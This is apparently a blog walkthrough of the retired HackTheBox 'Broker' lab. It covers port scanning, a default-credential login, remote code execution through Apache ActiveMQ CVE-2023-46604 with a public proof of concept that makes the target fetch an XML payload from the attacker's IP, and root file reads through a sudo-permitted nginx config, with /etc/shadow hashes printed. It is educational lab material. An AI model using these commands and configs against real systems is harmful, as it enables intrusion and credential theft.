---
title: Exploiting CVE-2023-46604 - Broker on HackTheBox
date: 2023-11-15 00:00:00 -500
categories: [Hacking for Beginners, Boot2root CTFs]
tags: [CTFs, HTB, Easy, Hacking]
image:
    path: https://i.ibb.co/mS1YMyj/broker.jpg
---

Hello g33ks, In this blog, I will guide you through the steps to solve the ***Broker*** machine on HacktheBox, part of the **Retired** labs on HacktheBox. This machine has been classified `Free` and **Easy** making it an ideal choice for beginners looking to embark on their journey into the exciting world of ethical hacking.

**Exploit the Lab [Here](https://affiliate.hackthebox.com/nenandjabhata)**.
**Start Hacking on TryHackMe [Here](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)**.

## Enumeration(Recon)
**First Basic Scan**
First i will start by doing a basic scan on our target IP.
```terminal
└─# nmap -p- --min-rate 10000 10.10.11.243                     
Host is up (6.3s latency).
Not shown: 44310 closed tcp ports (reset), 21219 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
1883/tcp  open  mqtt
61613/tcp open  unknown
61614/tcp open  unknown
61616/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 81.75 seconds

```
In this basic, i discovered some open ports on the target. But i don't want to stop here, so i will scan it also for a second time.
**Second Scan**
```terminal
└─# nmap -p 22,80,1883,5672,8161,39751,61613,61614,61616 -sCV 10.10.11.243                         
Host is up (0.85s latency).

PORT      STATE  SERVICE  VERSION
22/tcp    open   ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp    open   http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
1883/tcp  open   mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     ActiveMQ/Advisory/MasterBroker: 
|_    ActiveMQ/Advisory/Consumer/Topic/#: 
5672/tcp  open   amqp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
8161/tcp  open   http     Jetty 9.4.39.v20210325
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Error 401 Unauthorized
39751/tcp closed unknown
61613/tcp open   stomp    Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open   http     Jetty 9.4.39.v20210325
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Site doesn't have a title.
61616/tcp open   apachemq ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName 
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails 
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion 
|_    5.15.15
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
```
As observed in the command output, I've incorporated the `-sC` and `-sV` flags to retrieve additional details about the open ports on our target.
Now that we've identified multiple open HTTP ports, let's explore each of them to uncover potential vulnerabilities and gather more insights.
**Port 80**
![The ActiveMQ Website](https://i.ibb.co/Sn8nSQP/sc1.png){:class="img-responsive"}

Upon accessing Port 80, I encountered a website prompting for a password. A quick attempt with the default credentials `admin/admin` successfully granted access.

![The ActiveMQ Website](https://i.ibb.co/zh7G9VM/sc2.png){:class="img-responsive"}
Subsequently, after logging in, the interface appears as depicted in the following image:

**Identify the Vulnerability**
This HackTheBox machine, now retired, highlights the significant `CVE-2023-46604`vulnerability in ActiveMQ. A quick search for "ActiveMQ vulnerability"
I found 3 available Poc on Github.
[evkl1d Poc](https://github.com/evkl1d/CVE-2023-46604)
[SaumyajeetDas Poc](https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ)
[Duck-Sec Poc](https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell)
I will use the Duck-Sec Poc to solve this Box.

## Exploitation
To exploit this we need just to clone the Duck-Sec Poc and run the exploit against our machine.
But first we will run with `-h` flag to understand how to use the exploit.
```terminal
└─# python3 exploit.py -h                                      
usage: exploit.py [-h] -i IP [-p PORT] -si SRVIP [-sp SRVPORT]

options:
  -h, --help            show this help message and exit
  -i IP, --ip IP        ActiveMQ Server IP or Hostname
  -p PORT, --port PORT  ActiveMQ Server Port, defaults to 61616
  -si SRVIP, --srvip SRVIP
                        Serve IP
  -sp SRVPORT, --srvport SRVPORT
                        Serve port, defaults to 8080

```
To run it we need to specify the `i` for the target IP, the `-p` is the activeMQ port, the default is `61616` which we found in our nmap scan.
```terminal
└─# python3 exploit.py -i 10.10.11.243 -si 10.10.16.64 -sp 80  
#################################################################################
#  CVE-2023-46604 - Apache ActiveMQ - Remote Code Execution - Pseudo Shell      #
#  Exploit by Ducksec, Original POC by X1r0z, Python POC by evkl1d              #
#################################################################################

[*] Target: 10.10.11.243:61616
[*] Serving XML at: http://10.10.16.64:80/poc.xml
[!] This is a semi-interactive pseudo-shell, you cannot cd, but you can ls-lah / for example.
[*] Type 'exit' to quit

#################################################################################
# Not yet connected, send a command to test connection to host.                 #
# Prompt will change to Apache ActiveMQ$ once at least one response is received #
# Please note this is a one-off connection check, re-run the script if you      #
# want to re-check the connection.                                              #
#################################################################################

[Target not responding!]$ id
uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
```
Now we have our shell as `activemq`, let's grab the `user.txt`.
```terminal
$ cat user.txt
abb154f8786b43bXXXXXXXXXXXXXX
$ 
```

## Privilege Escalation
To elevate my privilege from user to root, each time I run `sudo -l` first.
```
$ sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
``` 
The activemq user can run `nginx`  without password, interessting we will exploit this.
**File Read**
I will create a nginx server events
Ressources for that : https://www.nginx.com/resources/wiki/start/topics/examples/full/
Here is the event that i will use.
```
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1337;
        root /;
        autoindex on;
    }
}
```
For that i will write it on `/dev/shm/file.conf`.
I’ll start the webserver by running `nginx` with `-c` and the full path to this file.
```terminal
$ sudo /usr/sbin/nginx -c /dev/shm/file.conf
```
Now i will just query the webserver on the port `1337` which was specified in the config file. and also read sensitive file on it
```terminal
$ curl http://localhost:1337/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
activemq:x:1000:1000:,,,:/home/activemq:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
``` 
Yesss, it's work. I will continue on it by trying some other sensitive files, like `/etc/shadow` or `/root/root.txt`
```terminal
$ curl http://localhost:1337/etc/shadow
root:$y$j9T$S6NkiGlTDU3IUcdBZEjJe0$sSHRUiGL/v4FZkWjU.HZ6cX2vsMY/rdFBTt25LbGxf1:19666:0:99999:7:::
daemon:*:19405:0:99999:7:::
bin:*:19405:0:99999:7:::
sys:*:19405:0:99999:7:::
sync:*:19405:0:99999:7:::
games:*:19405:0:99999:7:::
man:*:19405:0:99999:7:::
lp:*:19405:0:99999:7:::
mail:*:19405:0:99999:7:::
news:*:19405:0:99999:7:::
uucp:*:19405:0:99999:7:::
proxy:*:19405:0:99999:7:::
www-data:*:19405:0:99999:7:::
backup:*:19405:0:99999:7:::
list:*:19405:0:99999:7:::
irc:*:19405:0:99999:7:::
gnats:*:19405:0:99999:7:::
nobody:*:19405:0:99999:7:::
_apt:*:19405:0:99999:7:::
systemd-network:*:19405:0:99999:7:::
systemd-resolve:*:19405:0:99999:7:::
activemq:$y$j9T$5eMce1NhiF0t9/ZVwn39P1$pCfvgXtARGXPYDdn2AVdkCnXDf7YO7He/x666g6qLM5:19666:0:99999:7:::
```
We exploited it successfuly, so we will complete it by grabing the root flag.
```terminal
$ curl http://localhost:1337/root/root.txt
74a9e0d446b2dXXXXXXXXXXXXXXXXXX
```
Thanks for reading.
### Join Us
Thanks for reading. **Let's learn, explore, and hack together**. **Join us on Discord [here](https://discord.gg/wBT9wr9ruG)**. 
